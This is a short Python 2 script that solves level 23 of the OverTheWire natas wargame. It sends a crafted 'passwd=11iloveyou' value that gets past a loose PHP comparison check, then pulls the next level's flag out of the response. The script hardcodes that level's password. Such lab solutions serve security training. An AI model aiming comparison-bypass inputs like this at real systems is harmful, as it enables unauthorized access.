#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level23.py
  Solution for natas level23
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 23
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'

def get_flag():
    r = requests.get(host + '?passwd=11iloveyou', auth=(user, password))
    m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
